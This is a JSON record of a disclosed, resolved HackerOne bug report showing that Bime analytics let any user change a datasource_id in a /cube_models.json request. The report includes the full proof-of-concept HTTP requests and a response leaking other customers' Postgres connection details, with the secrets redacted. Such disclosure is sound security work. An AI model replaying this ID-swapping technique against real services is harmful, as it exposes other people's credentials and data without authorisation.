@@ -1,0 +1,121 @@
+{
+  "id": 149907,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDk5MDc=",
+  "url": "https://hackerone.com/reports/149907",
+  "title": "Urgent: attacker can access every data source on Bime",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-08T03:53:26.690Z",
+  "submitted_at": "2016-07-08T03:53:26.690Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jobert",
+    "url": "/jobert",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7068,
+    "url": "https://hackerone.com/bime",
+    "handle": "bime",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/068/046bc25f4f1f4c11ec1da9b821f0c112f4ab33e5_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Bime",
+      "twitter_handle": "",
+      "website": "https://www.bimeanalytics.com",
+      "about": "BIME allows customers to import data, create various queries, and view customizable dashboards - all within BIME's beautifully intuitive interface."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-27T15:00:35.144Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-07-15T22:01:38.211Z",
+  "team_member_agreed_on_going_public_at": "2016-07-27T15:00:35.052Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Vulnerability details\nI don't include words like \"urgent\" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the `/cube_models.json` endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.\n\n# Proof of concept\nSign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. I added a CSV as data source to set up a new dashboard. During this flow, the following request is sent to the server:\n\n```\nPOST /cube_models.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n\n{\"import_strategy\":\"replace\",\"configuration\":\"{\\\"bimeDb\\\":{\\\"arrayVarcharLength\\\":500,\\\"numberOfDecimals\\\":2},\\\"queryBlender\\\":{\\\"pushdown\\\":true,\\\"raiseWarnings\\\":true},\\\"infiniteCache\\\":{},\\\"timeZone\\\":\\\"\\\",\\\"mergeFields\\\":\\\"\\\",\\\"schedule\\\":{\\\"cronExp\\\":\\\"0 0 0 * * ?\\\",\\\"cronText\\\":\\\"Every day at 00 : 00\\\",\\\"emailOnSuccess\\\":false,\\\"emailOnFailure\\\":false,\\\"refreshRate\\\":\\\"importNow\\\"},\\\"bundle\\\":{},\\\"sortWeekdayFromMonday\\\":true}\",\"model_category_id\":527921,\"name\":\"CSV Connection 1\",\"cache_type\":\"dejaVu\",\"use_cache\":true,\"datasource_id\":723592,\"technical_type\":\"filePicker\",\"in_memory_cache_time_to_live\":15,\"cube_schema\":\"PE9MQVBTY2hlbWEgZm9sZGVycz0iZXlKaGRIUnlhV0oxZEdWelJtOXNaR1Z5Y3lJNlcxMHNJbTFsWVhOMWNtVnpSbTlzWkdWeWN5STZXMTBzSW0xbFlYTjFjbVZ6Um05c1pHVnljMFJwYzNCc1lYbEdiM0p0WVhSeklqcGJYWDA9IiBsYWJlbD0iY3N2Y29ubmVjdGlvbjEtYmU2ODgiIGlzTGFyZ2VNb2RlbD0iZmFsc2UiIGFycmF5Q29sdW1ucz0iVzEwPSIgPjxEaW1lbnNpb25zPjxEaW1lbnNpb24gbGFiZWw9IkF4aXMgb2YgYW5hbHlzaXMiIGRpc3BsYXlOYW1lPSJBeGlzIG9mIGFuYWx5c2lzIiBpZD0iQXhpcyBvZiBhbmFseXNpcyI+PEF0dHJpYnV0ZXM+PEF0dHJpYnV0ZSBsYWJlbD0iSUQiIGRlc2NyaXB0aW9uPSJJRCIgZGlzcGxheU5hbWU9IklEIiBmb2xkZXJJbmRleD0iMCIgb3JpZ2luYWxEaXNwbGF5TmFtZT0iSUQiIHJlYWxUeXBlPSJtZWFzdXJlIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjxBdHRyaWJ1dGUgbGFiZWw9InRpdGxlIiBkZXNjcmlwdGlvbj0idGl0bGUiIGRpc3BsYXlOYW1lPSJ0aXRsZSIgZm9sZGVySW5kZXg9IjAiIG9yaWdpbmFsRGlzcGxheU5hbWU9InRpdGxlIiByZWFsVHlwZT0iY3VzdG9tIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjwvQXR0cmlidXRlcz48L0RpbWVuc2lvbj48L0RpbWVuc2lvbnM+PE1lYXN1cmVzIGRpc3BsYXlGb3JtYXQ9InN0YW5kYXJkX1dBQ18wX1dBQ18xMDAwX1dBQ19fV0FDX19XQUNfLl9XQUNfIF9XQUNfMV9XQUNfIj48L01lYXN1cmVzPjxDYWxjdWxhdGVkRmllbGRzPjxDYWxjdWxhdGVkTWVhc3VyZXM+PC9DYWxjdWxhdGVkTWVhc3VyZXM+PENhbGN1bGF0ZWRBdHRyaWJ1dGVzPjwvQ2FsY3VsYXRlZEF0dHJpYnV0ZXM+PC9DYWxjdWxhdGVkRmllbGRzPjwvT0xBUFNjaGVtYT4=\"}\n```\n\nNotice the `datasource_id` in this request. Send this request to the server again, but this time, change the ID to the data source that you want to access. You don't need to know the actual type of the datasource. After this, send a `GET` request to the `/datasources.json` endpoint, like shown below.\n\n```\nGET /datasources.json HTTP/1.1\nHost: h1-bugbounty.bime.io\n...\n```\n\n```\nHTTP/1.1 200 OK\n...\n\n[...\n{\n  \"id\": 723591,\n  \"technical_type\": \"Relational Databases\",\n  \"external_id\": \"█████████.db.databaselabs.io\",\n  \"login\": \"bot\",\n  \"email\": null,\n  \"tocken\": \"true\",\n  \"url\": \"█████████\",\n  \"public_key\": \"customSQL\",\n  \"private_key\": \"true\",\n  \"extra_param1_name\": \"dbPort\",\n  \"extra_param1_value\": \"5432\",\n  \"extra_param2_name\": null,\n  \"extra_param2_value\": \"postgreSQL\",\n  \"extra_param3_name\": null,\n  \"extra_param3_value\": \"██████████\",\n  \"created_at\": \"2016-07-08T03:09:29.000Z\",\n  \"updated_at\": \"2016-07-08T03:35:36.000Z\",\n  \"datasource_version\": 2,\n  \"configuration\": \"{\\\"invalidDateAs\\\":\\\"null\\\",\\\"meta\\\":{\\\"useReusableToken\\\":true},\\\"cloudStorage\\\":{\\\"bigQuery\\\":{},\\\"redshift\\\":{\\\"useEscapingV2\\\":true},\\\"useEscapingV2\\\":true},\\\"sqlServerLocale\\\":\\\"english\\\",\\\"union\\\":{},\\\"useBifeV2\\\":true,\\\"sqlVersion\\\":2,\\\"joinCulling\\\":true,\\\"usePushDown\\\":true,\\\"jdbcParameters\\\":[],\\\"useCache\\\":false}\",\n  \"final_type\": \"postgresql\",\n  \"pwd\": \"██████████\"\n},\n...]\n```\n\nThis will give the attacker access to every datasource on the BIME platform. It'll also be reflected on the datasources page, when signed in to the platform:\n\n{F103801}\n\nLet me know if you need more information.",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 103801,
+      "file_name": "Screen_Shot_2016-07-07_at_20.39.52.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/103/801/ed5ca652c3610931349e4838fcd165c8eb04e8fc/Screen_Shot_2016-07-07_at_20.39.52.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-07-07_at_20.39.52.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-07-07_at_20.39.52.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQMPUPRRW%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T152142Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDUAMe96huAMJA5Ku%2BkKk2x0BGKeANw%2BehT0FpdSqew3wIgbYRgR7JyrTskEOx889dNsIteX16dVDG12edU%2B2SoBBEqsgUIMBADGgwwMTM2MTkyNzQ4NDkiDHjOfjDrRUX6agkr5iqPBaWVJm6mkCpcJw9t02ABC6BztF5wrYlJ%2F4Z1b4TbuNN3Wy0DtMvsJ4JhiFKYNMpzkCUHTVe8%2F106uZXaTJ1kCorUptbbDxI4I4XXx824Izg%2BHzfgtxP5%2FYqvUj4FIOcGPgjjGTrOHEUsDLQy9UoAgvuamCxhxwqKFc56XImyvBo%2B3HSipmcVJKQFpbj9Py%2FDl26H0wUrwtKsKUtZJoICTqdxxz0j9X8NhwUpf%2F0%2BV8dzs3r%2FKyid7FpwotgC8k31cPETf9JnUleOK6g3a%2BAXzf04VpqiGl%2FHhxAE%2BSUu8N3eMEkWn74K2l9azGc7YAMKG%2FOQd4nBx%2F8Z%2F%2Fkv2bnp9zs%2F9KM1keSdPp6vz58eVUTJ9DGDMexhuCsWscXVIm2eB%2F8zV65bhm9Yyed5zHAoC48yFiN%2FH%2B7S3W14YWpFyzSX5lLqAzNkyz1Zx3L%2B0oh%2B3vyvF5yZbCfo7A1NtsPTXA9Qf98TlXtD4AruTPUNlE5aP%2Bi1tlNq3OG3%2FmuCrJPSpxLtxqCigDzFgdBRzexs1B36pG4s9ht9L0gutB%2F%2BXvQK%2FL3%2BIvpfj9yXLJSd9UHca8HRFdaOQTKXNXm4fXjMTxXZGcPx7EdXnZOimvDnqE6piClDe76U0neoyNWP4OykG6%2BPFrY29bCj5S%2FiedXuTRxXjExsPjwAWFBU1o22mTyWfoQ709DTBRfc3YT%2BkpTag2K2De57UpgqcdA%2BaEQK5yYoS%2FiXItEb9j68NzfJleERRFNi4OwtDiPjHiE0LRTNVd%2B48upZK1b3Sih6WcKARPOZKLZi4TVrNIe41mGGcU6ubd207RAuNubBwaLNX1liQXX221vX8DYHbHORRfDNv5jcVNYViIsR8BLghDxjV1QwxLzFxgY6sQERHBGS0gA6o4%2Fje4i85M%2FGKFNI%2B9ddJLGKxnPflJqywXe%2BfT1vr0BGDKGzvMxGQ4CcQlcW1K8Dg2icKUmOKwI3qXos4Dya0w437Dw%2F6haBOSzssPAHCO%2FLSWbwfxjbSMf48QPYVzfFW2OdbWxaVaZADPOG1avHdjEKNZ67GCNLDAXHim3uLCyedAGGB%2FlKc5hsannKUGHYAQRtm%2BU0EBjX8f0OwsTqpvS5qydBCsb1XdI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2126d6e7aa00893526400abdc9be1827b428addebf83c9a9bf5166c070788d8a",
+      "file_size": 64878,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-08-14T22:01:38.374Z",
+  "allow_singular_disclosure_after": -287342404.13449526,
+  "singular_disclosure_allowed": true,
+  "vote_count": 56,
+  "voters": [
+    "sameoldstory",
+    "wargsec",
+    "bogdantc",
+    "inhibitor181",
+    "shailesh4594",
+    "niemand_sec",
+    "sameerphad72",
+    "michiel",
+    "dawgyg",
+    "yaworsk",
+    "and 46 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
